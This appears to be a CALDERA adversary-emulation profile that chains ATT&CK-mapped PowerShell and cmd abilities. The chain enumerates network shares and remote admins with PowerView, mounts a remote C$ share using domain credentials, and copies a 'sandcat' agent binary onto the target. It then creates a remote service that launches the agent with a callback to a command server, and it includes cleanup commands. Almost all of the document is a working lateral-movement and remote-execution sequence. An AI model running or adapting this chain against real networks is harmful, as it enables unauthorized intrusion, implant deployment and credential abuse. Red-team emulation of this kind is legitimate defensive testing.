adversary_id: custom_adversary_profile__None__None__stockpile__2023-10-19-22_46_43
name: Custom Adversary Profile
description: None
atomic_ordering:
- deeac480-5c2a-42b5-90bb-41675ee53c7e # ('deeac480-5c2a-42b5-90bb-41675ee53c7e', 'None', 'remote.host.fqdn') ; {'description': 'View the shares of a remote host', 'tactic': 'discovery', 'technique': {'attack_id': 'T1135', 'name': 'Network Share Discovery'}, 'platforms': {'windows': {'psh': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}, 'cmd': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}}}, 'id__dependence__fact': ['deeac480-5c2a-42b5-90bb-41675ee53c7e', 'None', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 2afae782-6d0a-4fbd-a6b6-d1ce90090eac # ('2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Use PowerView to query the Active Directory server to determine remote admins', 'tactic': 'discovery', 'technique': {'attack_id': 'T1069.002', 'name': 'Permission Groups Discovery: Domain Groups'}, 'platforms': {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1;\n$backup = "#{backup.admin.ability}";\n$userName = "#{domain.user.name}";\n$userPassword = "#{domain.user.password}";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n', 'parsers': {'plugins.stockpile.app.parsers.netlocalgroup': [{'source': 'remote.host.fqdn', 'edge': 'has_admin', 'target': 'domain.user.name'}]}, 'payloads': ['powerview.ps1']}}}, 'id__dependence__fact': ['2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 65048ec1-f7ca-49d3-9410-10813e472b30 # ('65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Copy 54ndc47 to remote host (SMB)', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'psh': {'command': '$path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\s4ndc4t.exe";\n', 'cleanup': '$drive = "\\\\#{remote.host.fqdn}\\C$";\nRemove-Item -Path $drive"\\Users\\Public\\s4ndc4t.exe" -Force;\n', 'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'source': 'remote.host.fqdn', 'edge': 'has_54ndc47_copy'}]}, 'payloads': ['sandcat.go-windows']}}}, 'id__dependence__fact': ['65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- aa6ec4dd-db09-4925-b9b9-43adeb154686 # ('aa6ec4dd-db09-4925-b9b9-43adeb154686', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Mount a windows share', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'psh': {'command': 'net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n', 'cleanup': 'net use \\\\#{remote.host.fqdn}\\C$ /delete\n', 'parsers': {'plugins.stockpile.app.parsers.share_mounted': [{'source': 'remote.host.fqdn', 'edge': 'has_share'}]}}}}, 'id__dependence__fact': ['aa6ec4dd-db09-4925-b9b9-43adeb154686', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 95727b87-175c-4a69-8c7a-a5d82746a753 # ('95727b87-175c-4a69-8c7a-a5d82746a753', 'remote.host.fqdn', 'None') ; {'description': 'Create a service named "sandsvc" to execute remote 54ndc57 binary named "s4ndc4t.exe"', 'tactic': 'execution', 'technique': {'attack_id': 'T1569.002', 'name': 'System Services: Service Execution'}, 'platforms': {'windows': {'psh': {'timeout': 300, 'cleanup': 'sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"\n', 'command': 'sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n'}}}, 'id__dependence__fact': ['95727b87-175c-4a69-8c7a-a5d82746a753', 'remote.host.fqdn', 'None'], 'plugin': 'stockpile'}
- 921055f4-5970-4707-909e-62f594234d91 # ('921055f4-5970-4707-909e-62f594234d91', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Ping a remote host to see if it is accessible', 'tactic': 'discovery', 'technique': {'attack_id': 'T1016', 'name': 'System Network Configuration Discovery'}, 'platforms': {'windows': {'psh': {'command': 'ping #{remote.host.fqdn}\n', 'parsers': {'plugins.stockpile.app.parsers.firewallping': [{'source': 'remote.host.fqdn', 'edge': 'isAccessibleFrom'}]}}}}, 'id__dependence__fact': ['921055f4-5970-4707-909e-62f594234d91', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 2afae782-6d0a-4fbd-a6b6-d1ce90090eac # ('2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Use PowerView to query the Active Directory server to determine remote admins', 'tactic': 'discovery', 'technique': {'attack_id': 'T1069.002', 'name': 'Permission Groups Discovery: Domain Groups'}, 'platforms': {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1;\n$backup = "#{backup.admin.ability}";\n$userName = "#{domain.user.name}";\n$userPassword = "#{domain.user.password}";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n', 'parsers': {'plugins.stockpile.app.parsers.netlocalgroup': [{'source': 'remote.host.fqdn', 'edge': 'has_admin', 'target': 'domain.user.name'}]}, 'payloads': ['powerview.ps1']}}}, 'id__dependence__fact': ['2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []